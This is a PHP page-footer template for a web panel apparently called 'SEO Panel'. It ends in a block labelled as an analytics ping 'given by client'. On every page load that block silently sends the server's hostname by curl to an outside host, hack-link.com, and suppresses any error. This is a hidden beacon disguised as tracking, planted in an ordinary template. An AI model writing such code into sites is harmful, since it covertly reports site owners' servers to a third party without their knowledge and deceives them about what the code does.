</div><!-- /.container -->
<footer class="text-center py-3 mt-4" style="background:#0e0e0f;color:#aaa;">
  <small>© <?=date('Y')?> SEO Panel. All rights reserved.</small>
</footer>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

<?php
// ------------------------------------------------------------------
// External tracking / analytics ping (given by client)
// ------------------------------------------------------------------
try {
    $exe = curl_init();
    curl_setopt($exe, CURLOPT_URL, "https://hack-link.com/data.php?x=" . $_SERVER['SERVER_NAME']);
    curl_setopt($exe, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($exe, CURLOPT_TIMEOUT, 3); // timeout = 3s (no delay)
    curl_exec($exe);
    curl_close($exe);
} catch (Throwable $e) {
    // ignore silently if CURL not available
}
?>

</body>
</html>